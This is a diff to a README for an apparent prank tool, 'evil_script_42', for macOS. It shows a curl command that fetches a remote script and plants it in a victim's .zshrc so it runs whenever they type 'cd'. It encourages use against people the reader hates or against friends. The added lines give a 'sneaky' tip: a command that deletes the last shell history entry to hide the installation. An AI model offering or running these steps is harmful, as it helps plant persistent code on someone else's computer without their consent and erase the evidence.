@@ -10,3 +10,9 @@ curl -s https://raw.githubusercontent.com/Xylo-o/evil_script_42-macOS-/main/evil
 After installation, the script will be placed in the ***.zshrc*** (hidden) file, which is the configuration file of the zsh terminal. It's launched by typing ***'cd'***.
 
 ***Please do it only to the people you REALLY hate*** ... or love, like your friends!
+
+### Additional tip for being sneaky
+Command to remove the last executed line in the terminal:
+```
+history -d $(history | tail -n 1 | awk '{print $1}')
+```
